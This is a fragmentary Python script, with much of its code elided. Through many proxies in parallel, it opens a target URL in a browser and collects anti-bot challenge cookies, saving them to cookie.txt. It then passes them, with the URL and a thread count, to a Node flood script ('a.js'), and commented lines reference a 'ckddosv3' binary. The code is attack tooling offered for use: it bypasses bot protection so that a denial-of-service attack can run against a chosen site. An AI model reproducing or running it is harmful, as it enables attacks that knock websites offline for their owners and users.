...
def connect_socks(socks_address):
    ...
    if hehe==1:
        ...
        return False
def double_click_at_coordinates(url, proxy_address):
        ...
        try:
            ...
            if html.find("word-wrap: break-word; white-space: pre-wrap;")!=-1:
                ...
                if cookies==[]:
                    ...
                    for i in range(1,30):
                        try:
                            ...
                            if str(cookies123).find('s1_s_cc')!=-1:
                ...
                for cookie in cookies:
                    if (len(str(cookie['value']).strip())>10) and (str(cookie['name']).find('s1_s_cc')!=-1):
                        print(f"{proxy_address}|{cookie_string}|{a123}")
                        #subprocess.run(['screen', '-dm', 'node','a.js', url, '120', '1', proxy_address, '1', cookie_string,a123, 'GET','TRIAL'])
                        a=open("cookie.txt", "a")
                        a.write(f"{proxy_address}|{cookie_string}|{a123}\n")
                        a.close()
                        #subprocess.run(['screen', '-dm', 'node a.js', url, '120', '1', proxy_address, '100', cookie_string , a123, 'GET','TRIAL'])
                        #subprocess.run(['screen','-dm','./ckddosv3', url, a123, '120', cookie_string, 'GET', '1000', proxy_address])
                        ...
                        if cookies123==[]:
                            ...
                            for i in range(1,30):
                                try:
                                    ...
                                    if str(cookies12333).find('s1_s_cc')!=-1:
                                        break
                                    node = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div')
                        ...
                        for cookie1 in cookies123:
                            if (len(str(cookie1['value']).strip())>10) and (str(cookie1['name']).find('s1_s_cc')!=-1):
                                print(f"{proxy_address}|{cookie_string}|{a123}")
                                subprocess.run(['screen', '-dm', 'node','a.js', url, '120', '1', proxy_address, '32', cookie_string,a123, 'GET','TRIAL'])
                                #subprocess.run(['screen', '-dm', 'node a.js', url, '120', '1', proxy_address, '100', cookie_string , a123, 'GET','TRIAL'])
                                #subprocess.run(['screen','-dm','./ckddosv3', url, a123, '120', cookie_string, 'GET', '500', proxy_address])
            ...
            driver.quit()
import sys
def main(proxy_address,url1):
    url = url1  # Replace with your desired URL
    try:
        double_click_at_coordinates(url, proxy_address)
    except Exception as e:
    ...
    try:
        ...
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            ...
            for proxy in proxies:
                future = executor.submit(main, proxy, url)
